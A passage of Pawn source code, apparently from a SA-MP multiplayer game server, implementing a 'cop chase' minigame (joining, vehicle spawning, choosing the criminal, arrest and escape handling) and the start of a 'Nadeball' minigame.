		crews[GROUP_COPCHASE] = 1;
	} else {
		format(strings, sizeof(strings), "[S]: "EMBED_ORANGE"%s has joined the cop chase [Players: %d/%d]", playername, ccplayers, MAX_COPCHASE_PLAYERS);
		for (new acp = 0; acp < MAX_PLAYERS; acp++)
		{
			if (IsPlayerConnected(acp) && player[acp][playingcc] == 1)
			SendClientMessage(acp, COLOR_NAVYBLUE, strings);
		}
	}
	player[playerid][moviecrew] = GROUP_COPCHASE;
	TextDrawShowForPlayer(playerid, cchelptd1);
	TextDrawShowForPlayer(playerid, cchelptd2);
	SetPlayerTeam(playerid, TEAM_COPS);
		
	if (ccsecondsleft <= 10)
	{
		if (ccplayers > MAX_COPCHASE_PLAYERS)
  		{
			SendServerMessageToAll(EMBED_DARKRED, "ServerError: ERROR #1 for the cop chase");
			return 1;
		}
		SetPlayerVirtualWorld(playerid, WORLDID_COPCHASE);
		SetPlayerInterior(playerid, 0);

		player[playerid][antifall] 	= 0;
		player[playerid][godmode] 	= 0;
		player[playerid][vgodmode] 	= 0;
	 	player[playerid][running] 	= 0;
	 	player[playerid][walking]	= 0;
	    player[playerid][skating] 	= 0;
	    player[playerid][swimming] 	= 0;
		player[playerid][ramps] 	= 0;
		if (player[playerid][strew] == 1)
		{
			player[playerid][strew] = 0;
			KillTimer(player[playerid][aftimer]);
			DestroyPlayerObject(playerid, player[playerid][strewid]);
			player[playerid][strewid] = -1;
		}

		SetPlayerPos(playerid, 2495.33, -1683.19, 13.34);
		SetPlayerFacingAngle(playerid, 0.0);
		SetPlayerColor(playerid, COLOR_INVISIBLE);
		SetPlayerArmour(playerid, 0.0);
  		SetPlayerHealth(playerid, 100.0);
		ResetPlayerWeapons(playerid);
  		ResetPlayerMoney(playerid);
  		TogglePlayerControllable(playerid, 0);
		TextDrawShowForPlayer(playerid, ccstatus[playerid]);
		TextDrawShowForPlayer(playerid, ccstatus2);
		TextDrawShowForPlayer(playerid, ccstatus3);
		TextDrawShowForPlayer(playerid, ccstatus4);
		TextDrawShowForPlayer(playerid, ccstatus5);
		SetPlayerTime(playerid, 0, 0);
		SetPlayerWeather(playerid, CopchaseWeathers[random(sizeof(CopchaseWeathers))]);
  		GivePlayerWeapon(playerid, 24, 100);
		TextDrawHideForPlayer(playerid, cchelptd1);
		TextDrawHideForPlayer(playerid, cchelptd2);
		SetPlayerWorldBounds(playerid, 2913.5627, 64.7815, -540.8007, -2794.5820);

		for (new listplayers = 0; listplayers < MAX_COPCHASE_PLAYERS; listplayers++)
		{
		    if (ccplayerlist[listplayers] == -1)
		    {
			  	ccplayerlist[listplayers] = playerid;
			  	break;
		  	}
		}

		if (currentcccriminal != playerid)
		{
	  		SetPlayerSkin(playerid, CopSkins[random(sizeof(CopSkins))]);
	  		GivePlayerWeapon(playerid, 3, 100);
		
			new VehicleID;
			switch(ccplayers-1)
			{
			    case 1:
			    {
					VehicleID = CreateVehicle(596, 2492.7158, -1659.4906, 13.0655, 89.9141, 0, 1, 3600000);
			        SetVehicleVirtualWorld(VehicleID, WORLDID_COPCHASE);
			        PutPlayerInVehicle(playerid, VehicleID, 0);
					vehicle[VehicleID][Objective] = 0;
					vehicle[VehicleID][Locked] = 0;
			    }
			    case 2:
			    {
					VehicleID = CreateVehicle(596, 2495.5313, -1663.0159, 13.0591, 87.8723, 0, 1, 3600000);
			        SetVehicleVirtualWorld(VehicleID, WORLDID_COPCHASE);
			        PutPlayerInVehicle(playerid, VehicleID, 0);
					vehicle[VehicleID][Objective] = 0;
					vehicle[VehicleID][Locked] = 0;
			    }
			    case 3:
			    {
					VehicleID = CreateVehicle(596, 2495.6045, -1656.1947, 13.0953, 90.1633, 0, 1, 3600000);
			        SetVehicleVirtualWorld(VehicleID, WORLDID_COPCHASE);
			        PutPlayerInVehicle(playerid, VehicleID, 0);
					vehicle[VehicleID][Objective] = 0;
					vehicle[VehicleID][Locked] = 0;
			    }
			    case 4:
			    {
					VehicleID = CreateVehicle(596, 2506.0298, -1664.2799, 13.1179, 83.4250, 0, 1, 3600000);
			        SetVehicleVirtualWorld(VehicleID, WORLDID_COPCHASE);
			        PutPlayerInVehicle(playerid, VehicleID, 0);
					vehicle[VehicleID][Objective] = 0;
					vehicle[VehicleID][Locked] = 0;
			    }
			    case 5:
			    {
					VehicleID = CreateVehicle(596, 2507.0076, -1669.2596, 13.0456, 78.8676, 0, 1, 3600000);
			        SetVehicleVirtualWorld(VehicleID, WORLDID_COPCHASE);
			        PutPlayerInVehicle(playerid, VehicleID, 0);
					vehicle[VehicleID][Objective] = 0;
					vehicle[VehicleID][Locked] = 0;
			    }
			    case 6:
			    {
					VehicleID = CreateVehicle(596, 2505.3755, -1674.6625, 13.0232, 60.1488, 0, 1, 3600000);
			        SetVehicleVirtualWorld(VehicleID, WORLDID_COPCHASE);
			        PutPlayerInVehicle(playerid, VehicleID, 0);
					vehicle[VehicleID][Objective] = 0;
					vehicle[VehicleID][Locked] = 0;
				}
				case 7:
				{
					VehicleID = CreateVehicle(596, 2502.4827, -1678.2574, 13.0917, 63.1300, 0, 1, 3600000);
			        SetVehicleVirtualWorld(VehicleID, WORLDID_COPCHASE);
			        PutPlayerInVehicle(playerid, VehicleID, 0);
					vehicle[VehicleID][Objective] = 0;
					vehicle[VehicleID][Locked] = 0;
				}
				case 8..MAX_COPCHASE_PLAYERS:
				{
		   			for (new ccPlayer = ccplayers-8; ccPlayer < MAX_COPCHASE_PLAYERS; ccPlayer++)
					{
						if (ccplayerlist[ccPlayer] == -1)
						continue;

					    if (ccplayerlist[ccPlayer] != currentcccriminal)
					    {
							PutPlayerInVehicle(playerid, GetPlayerVehicleID( ccplayerlist[ccPlayer] ), 1);
			   				break;
						}
					}
				}
			}
			SetCameraBehindPlayer(playerid);
		}
		
		for (new i = 0; i < VIP_MAX_OSTICKS; i++)
		{
		    if (pSObject[playerid][i][so_object] != -1)
		    {
			    DestroyObject(pSObject[playerid][i][so_object]);
				pSObject[playerid][i][so_object] = -1;
			}
		}

		for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
		{
			if (IsPlayerAttachedObjectSlotUsed(playerid, pi))
			RemovePlayerAttachedObject(playerid, pi);
		}
	}
	
	if (ccplayers == MAX_COPCHASE_PLAYERS && ccsecondsleft >= 10)
	{
		PreloadCC();
	    ccsecondsleft = 9;
	}
	return 1;
}

public RemoveCCPlayerEx(playerid)
{
	ccplayers--;
	TextDrawHideForPlayer(playerid, ccstatus[playerid]);
	TextDrawHideForPlayer(playerid, ccstatus2);
	TextDrawHideForPlayer(playerid, ccstatus3);
	TextDrawHideForPlayer(playerid, ccstatus4);
	TextDrawHideForPlayer(playerid, ccstatus5);
	if (servergodmode) player[playerid][godmode] = 1;
	SetPlayerColor(playerid, PlayerColors[random(sizeof(PlayerColors))]);
	player[playerid][playingcc] = 0;
	player[playerid][playerccmode] = 0;
	player[playerid][moviecrew] = -1;
	if (player[playerid][chat] == 3) player[playerid][chat] = 0;
	RemovePlayerFromVehicleEx(playerid);
	SpawnPlayer(playerid);
   	ResetBounds(playerid);
	SetPlayerTeam(playerid, playerid);

    new ccname[24];
    GetPlayerName(currentcccriminal, ccname, sizeof(ccname));
	if (currentcccriminal == playerid)
	{
		format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~r~%s~n~~w~was arrested by the cops!", ccname);
		SendMessageToCC(stringe, 5000);
		format(stringe, sizeof(stringe), "%s was arrested by the cops!", ccname);
		SendServerMessageToAll(EMBED_ORANGE, stringe);
		for (new cp = 0; cp < MAX_PLAYERS; cp++)
		{
			if (IsPlayerConnected(cp) && player[cp][playingcc] == 1)
			{
				TextDrawHideForPlayer(cp, ccstatus[cp]);
				TextDrawHideForPlayer(cp, ccstatus2);
				TextDrawHideForPlayer(cp, ccstatus3);
				TextDrawHideForPlayer(cp, ccstatus4);
				TextDrawHideForPlayer(cp, ccstatus5);
				if (servergodmode) player[cp][godmode] = 1;
				SetPlayerColor(cp, PlayerColors[random(sizeof(PlayerColors))]);
				player[cp][playingcc] = 0;
				player[cp][playerccmode] = 0;
 				RemovePlayerFromVehicleEx(cp);
				SpawnPlayer(cp);
				player[cp][moviecrew] = -1;
				if (player[cp][chat] == 3) player[cp][chat] = 0;
			   	ResetBounds(cp);
				SetPlayerTeam(cp, cp);
			}
		}
		StopCC();
		format(stringe, sizeof(stringe), "2 %s was arrested by the cops!", ccname);
		IRC_GroupSay(1, IRC_CHANNEL, stringe);
		return 1;
	} else if (ccplayers <= 1)
	{
		format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~b~%s~n~~w~has escaped by the cops!", ccname);
		SendMessageToCC(stringe, 5000);
		format(stringe, sizeof(stringe), "%s has escaped from the cops!", ccname);
		SendServerMessageToAll(EMBED_ORANGE, stringe);
		for (new cp = 0; cp < MAX_PLAYERS; cp++)
		{
			if (IsPlayerConnected(cp) && player[cp][playingcc] == 1)
			{
				TextDrawHideForPlayer(cp, ccstatus[cp]);
				TextDrawHideForPlayer(cp, ccstatus2);
				TextDrawHideForPlayer(cp, ccstatus3);
				TextDrawHideForPlayer(cp, ccstatus4);
				TextDrawHideForPlayer(cp, ccstatus5);
				if (servergodmode) player[cp][godmode] = 1;
				SetPlayerColor(cp, PlayerColors[random(sizeof(PlayerColors))]);
				player[cp][playingcc] = 0;
				player[cp][playerccmode] = 0;
				RemovePlayerFromVehicleEx(cp);
				SpawnPlayer(cp);
				player[cp][moviecrew] = -1;
				if (player[cp][chat] == 3) player[cp][chat] = 0;
			   	ResetBounds(cp);
				SetPlayerTeam(cp, cp);
			}
		}
		StopCC();
		format(stringe, sizeof(stringe), "2 %s has escaped from the cops!", ccname);
		IRC_GroupSay(1, IRC_CHANNEL, stringe);
		return 1;
	} else {
		for (new ccP = 0; ccP < MAX_COPCHASE_PLAYERS; ccP++)
		{
		    if (ccplayerlist[ccP] == -1)
		    continue;
		
			if (ccplayerlist[ccP] == playerid)
			{
				ccplayerlist[ccP] = -1;
				break;
			}
		}
	}
	UpdateCCStatus();
	return 1;
}

stock RemoveCCPlayer(playerid, reason[])
{
	ccplayers--;
	GetPlayerName(playerid, playername, sizeof(playername));
	format(strings, sizeof(strings), "[S]: "EMBED_ORANGE"%s left the cop chase. (%s)", playername, reason);
	for (new acp = 0; acp < MAX_PLAYERS; acp++)
	{
		if (IsPlayerConnected(acp) && player[acp][playingcc] == 1)
		SendClientMessage(acp, COLOR_NAVYBLUE, strings);
	}

	format(strings, sizeof(strings), "2 %s left the cop chase. (%s)", playername, reason);
	IRC_GroupSay(1, IRC_CHANNEL, strings);
	TextDrawHideForPlayer(playerid, ccstatus[playerid]);
	TextDrawHideForPlayer(playerid, ccstatus2);
	TextDrawHideForPlayer(playerid, ccstatus3);
	TextDrawHideForPlayer(playerid, ccstatus4);
	TextDrawHideForPlayer(playerid, ccstatus5);
	if (servergodmode) player[playerid][godmode] = 1;
	SetPlayerColor(playerid, PlayerColors[random(sizeof(PlayerColors))]);
	player[playerid][playingcc] = 0;
	player[playerid][playerccmode] = 0;
	player[playerid][moviecrew] = -1;
	if (player[playerid][chat] == 3) player[playerid][chat] = 0;
	TextDrawHideForPlayer(playerid, cchelptd1);
	TextDrawHideForPlayer(playerid, cchelptd2);
	RemovePlayerFromVehicleEx(playerid);
   	ResetBounds(playerid);
	SetPlayerTeam(playerid, playerid);

    new ccname[24];
    GetPlayerName(currentcccriminal, ccname, sizeof(ccname));
	if (currentcccriminal == playerid)
	{
		format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~r~%s~n~~w~was arrested by the cops!", ccname);
		SendMessageToCC(stringe, 5000);
		format(stringe, sizeof(stringe), "%s was arrested by the cops!", ccname);
		SendServerMessageToAll(EMBED_ORANGE, stringe);
		for (new cp = 0; cp < MAX_PLAYERS; cp++)
		{
			if (IsPlayerConnected(cp) && player[cp][playingcc] == 1)
			{
				TextDrawHideForPlayer(cp, ccstatus[cp]);
				TextDrawHideForPlayer(cp, ccstatus2);
				TextDrawHideForPlayer(cp, ccstatus3);
				TextDrawHideForPlayer(cp, ccstatus4);
				TextDrawHideForPlayer(cp, ccstatus5);
				if (servergodmode) player[cp][godmode] = 1;
				SetPlayerColor(cp, PlayerColors[random(sizeof(PlayerColors))]);
				player[cp][playingcc] = 0;
				player[cp][playerccmode] = 0;
 				RemovePlayerFromVehicleEx(cp);
				SpawnPlayer(cp);
				player[cp][moviecrew] = -1;
				if (player[cp][chat] == 3) player[cp][chat] = 0;
			   	ResetBounds(cp);
				SetPlayerTeam(cp, cp);
			}
		}
		StopCC();
		format(stringe, sizeof(stringe), "2 %s was arrested by the cops!", ccname);
		IRC_GroupSay(1, IRC_CHANNEL, stringe);
		return 1;
	} else if (ccplayers <= 1)
	{
	    if (ccstarted == false)
		{
			for (new cp = 0; cp < MAX_PLAYERS; cp++)
			{
				if (IsPlayerConnected(cp) && player[cp][playingcc] == 1)
				{
					TextDrawHideForPlayer(cp, ccstatus[cp]);
					TextDrawHideForPlayer(cp, ccstatus2);
					TextDrawHideForPlayer(cp, ccstatus3);
					TextDrawHideForPlayer(cp, ccstatus4);
					TextDrawHideForPlayer(cp, ccstatus5);
					if (servergodmode) player[cp][godmode] = 1;
					SetPlayerColor(cp, PlayerColors[random(sizeof(PlayerColors))]);
					player[cp][playingcc] = 0;
					player[cp][playerccmode] = 0;
	 				RemovePlayerFromVehicleEx(cp);
					SpawnPlayer(cp);
					player[cp][moviecrew] = -1;
					if (player[cp][chat] == 3) player[cp][chat] = 0;
				   	ResetBounds(cp);
					SetPlayerTeam(cp, cp);
				}
			}
			StopCC();
			SendServerMessageToAll(EMBED_ORANGE, "Stopped Cop Chase (No winner found)");
			IRC_GroupSay(1, IRC_CHANNEL, "2Stopped Cop Chase (No winner found)");
			return 1;
		} else {
			format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~b~%s~n~~w~has escaped by the cops!", ccname);
			SendMessageToCC(stringe, 5000);
			format(stringe, sizeof(stringe), "%s has escaped from the cops!", ccname);
			SendServerMessageToAll(EMBED_ORANGE, stringe);
			for (new cp = 0; cp < MAX_PLAYERS; cp++)
			{
				if (IsPlayerConnected(cp) && player[cp][playingcc] == 1)
				{
					TextDrawHideForPlayer(cp, ccstatus[cp]);
					TextDrawHideForPlayer(cp, ccstatus2);
					TextDrawHideForPlayer(cp, ccstatus3);
					TextDrawHideForPlayer(cp, ccstatus4);
					TextDrawHideForPlayer(cp, ccstatus5);
					if (servergodmode) player[cp][godmode] = 1;
					SetPlayerColor(cp, PlayerColors[random(sizeof(PlayerColors))]);
					player[cp][playingcc] = 0;
					player[cp][playerccmode] = 0;
	 				RemovePlayerFromVehicleEx(cp);
					SpawnPlayer(cp);
					player[cp][moviecrew] = -1;
					if (player[cp][chat] == 3) player[cp][chat] = 0;
				   	ResetBounds(cp);
					SetPlayerTeam(cp, cp);
				}
			}
			StopCC();
			format(stringe, sizeof(stringe), "2 %s has escaped from the cops!", ccname);
			IRC_GroupSay(1, IRC_CHANNEL, stringe);
			return 1;
		}
	} else {
		for (new ccP = 0; ccP < MAX_COPCHASE_PLAYERS; ccP++)
		{
		    if (ccplayerlist[ccP] == -1)
		    continue;

			if (ccplayerlist[ccP] == playerid)
			{
				ccplayerlist[ccP] = -1;
				break;
			}
		}
	}
	UpdateCCStatus();
	return 1;
}

stock PreloadCC()
{
	for (new dp = 0; dp < MAX_PLAYERS; dp++)
	{
		if (IsPlayerConnected(dp) && player[dp][playingcc] == 1)
		{
			SetPlayerInterior(dp, 0);
		    SetPlayerVirtualWorld(dp, WORLDID_COPCHASE);
			SetPlayerPos(dp, 2495.33, -1683.19, 13.34);
			SetPlayerFacingAngle(dp, 0.0);
		}
	}
	return 1;
}

stock LoadCC()
{
	if (ccplayers < MIN_COPCHASE_PLAYERS)
	{
		SendServerMessageToAll(EMBED_ORANGE, "The cop chase was not started because there were not enough players.");
		IRC_GroupSay(1, IRC_CHANNEL, "2The cop chase was not started because there were not enough players.");
		for (new dp = 0; dp < MAX_PLAYERS; dp++)
		{
			if (IsPlayerConnected(dp) && player[dp][playingcc] == 1)
			{
				GameTextForPlayer(dp, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~                       ~w~COP CHASE ~r~STOPPED!", 2000, 3);
				TextDrawHideForPlayer(dp, ccstatus[dp]);
				TextDrawHideForPlayer(dp, ccstatus2);
				TextDrawHideForPlayer(dp, ccstatus3);
				TextDrawHideForPlayer(dp, ccstatus4);
				TextDrawHideForPlayer(dp, ccstatus5);
				if (servergodmode) player[dp][godmode] = 1;
				SetPlayerColor(dp, PlayerColors[random(sizeof(PlayerColors))]);
				player[dp][playingcc] = 0;
				player[dp][playerccmode] = 0;
 				RemovePlayerFromVehicleEx(dp);
				SpawnPlayer(dp);
				TextDrawHideForPlayer(dp, cchelptd1);
				TextDrawHideForPlayer(dp, cchelptd2);
				player[dp][moviecrew] = -1;
				if (player[dp][chat] == 3) player[dp][chat] = 0;
				SetPlayerTeam(dp, dp);

		    }
		}
		StopCC();
	    return 1;
	}

	new ccname[24],
		VehicleID;

	for (new rp = 0; rp < MAX_PLAYERS; rp++)
	{
		if (IsPlayerConnected(rp) && player[rp][playingcc] == 1)
		{
			for (new listplayers = 0; listplayers < MAX_COPCHASE_PLAYERS; listplayers++)
			{
			    if (ccplayerlist[listplayers] == -1)
			    {
				  	ccplayerlist[listplayers] = rp;
				  	break;
			  	}
			}
		}
	}

	currentcccriminal = ccplayerlist[random(ccplayers)];
	GetPlayerName(currentcccriminal, ccname, sizeof(ccname));
	format(stringe, sizeof(stringe), "[RADIO] %s is now a criminal!", ccname);
	
	new rplaceused = 1,
		CCWeather = CopchaseWeathers[random(sizeof(CopchaseWeathers))];
	for (new rp = 0; rp < MAX_PLAYERS; rp++)
	{
		if (IsPlayerConnected(rp) && player[rp][playingcc] == 1)
		{
		    if (rplaceused > MAX_COPCHASE_PLAYERS)
		    {
				SendServerMessageToAll(EMBED_DARKRED, "ServerError: ERROR #1 for the cop chase");
				return 1;
			}
			
			SendClientMessage(rp, COLOR_ORANGE, stringe);

			player[rp][antifall] 	= 0;
			player[rp][godmode] 	= 0;
			player[rp][vgodmode] 	= 0;
		 	player[rp][running] 	= 0;
		 	player[rp][walking]		= 0;
		    player[rp][skating] 	= 0;
		    player[rp][swimming] 	= 0;
			player[rp][ramps] 		= 0;
			if (player[rp][strew] == 1)
			{
				player[rp][strew] = 0;
				KillTimer(player[rp][aftimer]);
				DestroyPlayerObject(rp, player[rp][strewid]);
				player[rp][strewid] = -1;
			}

			SetPlayerArmour(rp, 0.0);
	  		SetPlayerHealth(rp, 100.0);
			ResetPlayerWeapons(rp);
	  		ResetPlayerMoney(rp);
	  		TogglePlayerControllable(rp, 0);
			TextDrawShowForPlayer(rp, ccstatus[rp]);
			TextDrawShowForPlayer(rp, ccstatus2);
			TextDrawShowForPlayer(rp, ccstatus3);
			TextDrawShowForPlayer(rp, ccstatus4);
			TextDrawShowForPlayer(rp, ccstatus5);
			SetPlayerTime(rp, 0, 0);
			SetPlayerWeather(rp, CCWeather);
	  		//GivePlayerWeapon(rp, 24, 100); See OnPlayerStateChange (They spawn inside vehicles)
			TextDrawHideForPlayer(rp, cchelptd1);
			TextDrawHideForPlayer(rp, cchelptd2);
			//SetPlayerWorldBounds(rp, 2913.5627, 64.7815, -540.8007, -2794.5820);
			SetPlayerWorldBounds(rp, 2970.0, 50.0, -500.0, -2815.0);
		  		
			if (currentcccriminal != rp)
			{
				SetPlayerColor(rp, COLOR_INVISIBLE);
		  		SetPlayerSkin(rp, CopSkins[random(sizeof(CopSkins))]);
		  		//GivePlayerWeapon(rp, 3, 100);
	  		
				switch(rplaceused)
				{
				    case 1:
				    {
						VehicleID = CreateVehicle(596, 2492.7158, -1659.4906, 13.0655, 89.9141, 0, 1, 3600000);
				        SetVehicleVirtualWorld(VehicleID, WORLDID_COPCHASE);
				        PutPlayerInVehicle(rp, VehicleID, 0);
						vehicle[VehicleID][Objective] = 0;
						vehicle[VehicleID][Locked] = 0;
				    }
				    case 2:
				    {
						VehicleID = CreateVehicle(596, 2495.5313, -1663.0159, 13.0591, 87.8723, 0, 1, 3600000);
				        SetVehicleVirtualWorld(VehicleID, WORLDID_COPCHASE);
				        PutPlayerInVehicle(rp, VehicleID, 0);
						vehicle[VehicleID][Objective] = 0;
						vehicle[VehicleID][Locked] = 0;
				    }
				    case 3:
				    {
						VehicleID = CreateVehicle(596, 2495.6045, -1656.1947, 13.0953, 90.1633, 0, 1, 3600000);
				        SetVehicleVirtualWorld(VehicleID, WORLDID_COPCHASE);
				        PutPlayerInVehicle(rp, VehicleID, 0);
						vehicle[VehicleID][Objective] = 0;
						vehicle[VehicleID][Locked] = 0;
				    }
				    case 4:
				    {
						VehicleID = CreateVehicle(596, 2506.0298, -1664.2799, 13.1179, 83.4250, 0, 1, 3600000);
				        SetVehicleVirtualWorld(VehicleID, WORLDID_COPCHASE);
				        PutPlayerInVehicle(rp, VehicleID, 0);
						vehicle[VehicleID][Objective] = 0;
						vehicle[VehicleID][Locked] = 0;
				    }
				    case 5:
				    {
						VehicleID = CreateVehicle(596, 2507.0076, -1669.2596, 13.0456, 78.8676, 0, 1, 3600000);
				        SetVehicleVirtualWorld(VehicleID, WORLDID_COPCHASE);
				        PutPlayerInVehicle(rp, VehicleID, 0);
						vehicle[VehicleID][Objective] = 0;
						vehicle[VehicleID][Locked] = 0;
				    }
				    case 6:
				    {
						VehicleID = CreateVehicle(596, 2505.3755, -1674.6625, 13.0232, 60.1488, 0, 1, 3600000);
				        SetVehicleVirtualWorld(VehicleID, WORLDID_COPCHASE);
				        PutPlayerInVehicle(rp, VehicleID, 0);
						vehicle[VehicleID][Objective] = 0;
						vehicle[VehicleID][Locked] = 0;
					}
					case 7:
					{
						VehicleID = CreateVehicle(596, 2502.4827, -1678.2574, 13.0917, 63.1300, 0, 1, 3600000);
				        SetVehicleVirtualWorld(VehicleID, WORLDID_COPCHASE);
				        PutPlayerInVehicle(rp, VehicleID, 0);
						vehicle[VehicleID][Objective] = 0;
						vehicle[VehicleID][Locked] = 0;
					}
					case 8..MAX_COPCHASE_PLAYERS:
					{
			   			for (new ccPlayer = rplaceused-8; ccPlayer < MAX_COPCHASE_PLAYERS; ccPlayer++)
						{
							if (ccplayerlist[ccPlayer] == -1)
							continue;
						
						    if (ccplayerlist[ccPlayer] != currentcccriminal)
						    {
								PutPlayerInVehicle(rp, GetPlayerVehicleID( ccplayerlist[ccPlayer] ), 1);
				   				break;
							}
						}
					}
				}
				SetCameraBehindPlayer(rp);
				rplaceused++;
			}
			
			for (new i = 0; i < VIP_MAX_OSTICKS; i++)
			{
			    if (pSObject[rp][i][so_object] != -1)
			    {
				    DestroyObject(pSObject[rp][i][so_object]);
					pSObject[rp][i][so_object] = -1;
				}
			}

			for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
			{
				if (IsPlayerAttachedObjectSlotUsed(rp, pi))
				RemovePlayerAttachedObject(rp, pi);
			}
		}
	}
	
	SetPlayerColor(currentcccriminal, (COLOR_CORAL & COLOR_INVISIBLE));
	SetPlayerSkin(currentcccriminal, CriminalSkins[random(sizeof(CriminalSkins))]);
	currentccvehicle = CreateVehicle(542, 2460.7397, -1658.8334, 13.0481, 89.7890, 122,113, 3600000); // Clover
	SetVehicleVirtualWorld(currentccvehicle, WORLDID_COPCHASE);
	vehicle[currentccvehicle][Objective] = 0;
	vehicle[currentccvehicle][Locked] = 0;
	PutPlayerInVehicle(currentcccriminal, currentccvehicle, 0);
  	GivePlayerWeapon(currentcccriminal, 4, 1);
	TextDrawHideForPlayer(currentcccriminal, ccstatus2);
	TextDrawHideForPlayer(currentcccriminal, ccstatus3);
	TextDrawHideForPlayer(currentcccriminal, ccstatus4);
	TextDrawHideForPlayer(currentcccriminal, ccstatus5);
	player[currentcccriminal][moviecrew] = -1;
	if (player[currentcccriminal][chat] == 3) player[currentcccriminal][chat] = 0;
	SetPlayerTeam(currentcccriminal, TEAM_CRIMINAL);

	for (new i = 0; i < VIP_MAX_OSTICKS; i++)
	{
	    if (pSObject[currentcccriminal][i][so_object] != -1)
	    {
		    DestroyObject(pSObject[currentcccriminal][i][so_object]);
			pSObject[currentcccriminal][i][so_object] = -1;
		}
	}

	for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
	{
		if (IsPlayerAttachedObjectSlotUsed(currentcccriminal, pi))
		RemovePlayerAttachedObject(currentcccriminal, pi);
	}

	new sVehicleID;
	sVehicleID = CreateVehicle(497, 1598.74, -1666.47, 20.05, 187.96, 0, 1, 3600000); // Police maverick at LSPD roof
	SetVehicleVirtualWorld(sVehicleID, WORLDID_COPCHASE);
	vehicle[sVehicleID][Objective] = 0;
	vehicle[sVehicleID][Locked] = 0;
	
	sVehicleID = CreateVehicle(472, 727.12, -1495.02, 0.09, 180.35, 1, 0, 3600000); // Coastguard at Marina
	SetVehicleVirtualWorld(sVehicleID, WORLDID_COPCHASE);
	vehicle[sVehicleID][Objective] = 0;
	vehicle[sVehicleID][Locked] = 0;
	
   	UpdateCCStatus();

	//CallRemoteFunction("LoadMapMode", "ssi", "Maps/ccb.ini", "ccb", WORLDID_COPCHASE);
	return 1;
}

stock StartCC()
{
    ccstarted = true;

	for (new ccPlayer = 0; ccPlayer < MAX_COPCHASE_PLAYERS; ccPlayer++)
	{
		if (ccplayerlist[ccPlayer] == -1)
		continue;

	    if (player[ ccplayerlist[ccPlayer] ][playingcc] == 1)
	    {
			TogglePlayerControllable(ccplayerlist[ccPlayer], 1);
			GameTextForPlayer(ccplayerlist[ccPlayer], "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~COPCHASE ~g~STARTED!", 2000, 3);
		}
	}
	
	SendServerMessageToAll(EMBED_ORANGE, "The cop chase has started!");
	IRC_GroupSay(1, IRC_CHANNEL, "2The cop chase has started!");
   	UpdateCCStatus();
   	
	//mysql_run_query(mysqlConnection, "INSERT INTO "MYSQL_TABLE_SERVER_STATISTICS" (server_statistic_date, server_statistic_copchases_played) VALUES (CURDATE(), 1) ON DUPLICATE KEY UPDATE `server_statistic_id` = LAST_INSERT_ID(server_statistic_id), `server_statistic_copchases_played` = server_statistic_copchases_played +1", false, "", "");
	return 1;
}

stock StopCC()
{
	ccstarted = false;
	ccplayers = 0;
	ccsecondsleft = -5;
	ccsecondslefttillend = 600;
	ccsecondslefttillstatusupdate = 10;
	ccsecondslefttilllocationupdate = 120;
	currentcccriminal = -1;
	currentccvehicle = -1;
	
	for (new listplayers = 0; listplayers < MAX_COPCHASE_PLAYERS; listplayers++)
	{
	    ccplayerlist[listplayers] = -1;
	}

	for (new i = GAMEMODE_VEHICLES; i < MAX_VEHICLES; i++)
	{
	    if (GetVehicleVirtualWorld(i) == WORLDID_COPCHASE)
	    {
			vehicle[i][Owner] = -1;
			vehicle[i][Objective] = 0;
			vehicle[i][Locked] = 0;
			DestroyVehicle(i);
		}
	}
	crews[GROUP_COPCHASE] = 0;
	
	//CallRemoteFunction("UnloadMapMode", "ss", "Maps/ccb.ini", "ccb");
	return 1;
}

stock AddNBPlayer(playerid)
{
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
	player[playerid][playingnb] = 1;
	nbplayers++;

	GetPlayerName(playerid, playername, sizeof(playername));
	if (nbplayers == 1)
	{
		format(strings, sizeof(strings), "%s has started Nadeball [/nadeball - Max.Players: %d - Games: %d]", playername, MAX_NADEBALL_PLAYERS, DEFAULT_NADEBALL_GAMES);
		SendServerMessageToAll(EMBED_CORAL, strings);
		format(strings, sizeof(strings), "14 %s has started Nadeball [/nadeball - Max.Players: %d - Games: %d]", playername, MAX_NADEBALL_PLAYERS, DEFAULT_NADEBALL_GAMES);
		IRC_GroupSay(1, IRC_CHANNEL, strings);
		nbsecondsleft = 35;
	} else {
		format(strings, sizeof(strings), "[S]: "EMBED_CORAL"%s has joined Nadeball [Players: %d/%d]", playername, nbplayers, MAX_NADEBALL_PLAYERS);
		for (new acp = 0; acp < MAX_PLAYERS; acp++)
		{
			if (IsPlayerConnected(acp) && player[acp][playingnb] == 1)
			SendClientMessage(acp, COLOR_NAVYBLUE, strings);
		}
	}
	TextDrawShowForPlayer(playerid, nbhelptd1);
	TextDrawShowForPlayer(playerid, nbhelptd2);

	if (nbsecondsleft <= 5)
	{
		if (nbfield == 1) // 1 = LS
		{
		    if (nbplayers > MAX_NADEBALL_PLAYERS)
		    {
				SendServerMessageToAll(EMBED_DARKRED, "ServerError: ERROR #1 for nadeball");
				return 1;
			}

			SetPlayerVirtualWorld(playerid, WORLDID_NADEBALL);
			SetPlayerInterior(playerid, 0);

			player[playerid][antifall] 	= 0;
			player[playerid][godmode] 	= 1;
		 	player[playerid][running] 	= 0;
		 	player[playerid][walking]	= 0;
		    player[playerid][skating] 	= 0;
		    player[playerid][swimming] 	= 0;
			if (player[playerid][strew] == 1)
			{
				player[playerid][strew] = 0;
				KillTimer(player[playerid][aftimer]);
				DestroyPlayerObject(playerid, player[playerid][strewid]);
				player[playerid][strewid] = -1;
			}

			for (new listplayers = 0; listplayers < MAX_NADEBALL_PLAYERS; listplayers++)
			{
			    if (nbplayerlist[listplayers] == -1)
			    {
				  	nbplayerlist[listplayers] = playerid;
				  	break;
			  	}
			}

			player[playerid][playernbmode] = 1;
		    if (nbteam1players > nbteam2players)
		    {
                player[playerid][playernbteam] = 2;
				SetPlayerPos(playerid, 745.37 + (nbteam2players / 1.5), -1248.72 + (nbteam2players / 1.5), 13.34);
				SetPlayerFacingAngle(playerid, 0.0);
				SetPlayerColor(playerid, nbteam2colour);
				nbteam2players++;
		    } else {
